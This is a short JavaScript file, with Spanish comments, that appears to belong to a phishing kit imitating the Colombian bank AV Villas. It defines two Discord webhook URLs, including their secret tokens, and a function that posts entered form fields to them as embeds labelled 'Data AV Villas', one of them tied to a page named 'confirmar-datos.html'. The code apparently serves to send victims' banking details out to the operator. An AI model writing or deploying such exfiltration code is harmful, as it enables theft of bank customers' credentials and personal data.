// Discord.js

const WEBHOOK_1 = 'https://discord.com/api/webhooks/1400872392238301455/rvzD0jW24504OM42bltqo0N2EQ9ufMdiK3RC0sxWJFsM96uUcaGXJSeNQjQiY2Nh5asc'; // Reemplaza con tu webhook real
const WEBHOOK_2 = 'https://discord.com/api/webhooks/1400872876600459404/Yv4vpCfDYd8usradq83qOv-9GgfW-8tLrzFDxWPWAh8BYCZaAEjb4UQVCaHgEhbHicbJ'; // Solo para confirmar-datos.html

function enviarDatosAWebhook(titulo, campos, webhookURL = WEBHOOK_1) {
  const color = Math.floor(Math.random() * 16777215);

  const embed = {
    title: titulo,
    color: color,
    fields: campos.map(([name, value]) => ({
      name: ` ${name}`,
      value: `\`\`\`${value || 'No ingresado'}\`\`\``,
      inline: false
    })),
    footer: {
      text: "🔐 Data AV Villas"
    },
    timestamp: new Date().toISOString()
  };

  fetch(webhookURL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ embeds: [embed] })
  }).catch(console.error);
}